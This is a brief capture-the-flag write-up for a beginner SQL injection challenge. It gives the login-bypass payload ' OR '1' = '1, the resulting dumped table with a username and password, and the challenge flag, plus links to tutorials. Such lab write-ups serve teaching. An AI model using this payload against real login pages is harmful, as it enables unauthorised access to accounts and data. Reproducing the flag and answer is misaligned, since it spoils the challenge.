# SQL injection -  1 - The Most Basic Form of Injection. (3)

## Challenge
SQL injection is probably one of the most common vectors of attack for poorly designed websites. 
This page is vulnerable to it. You can use username test and password test if you want to test 
the page before the injection.
<br>
<a href="https://beginnersqli.hfctf.ca/">Use that vulnarable website</a>

## Steps
1. Username : `test`
2. Password : `' OR '1' = '1`

| userId | username |	  userpass   |
| ------ | -------- | ------------ |
|   1 	 |  sp00ky 	| SwibAPCMuj34 |

I use that <a href="https://youtu.be/cx6Xs3F_1Uc">tutorial</a> on Youtube.
<br>
This is another interesting SQL injection <a href="https://www.guru99.com/learn-sql-injection-with-practical-example.html">tutorial</a>.

## Flag
`HF-2wqkd1mdilwseoukimf2vfdqa5dmq9w6`
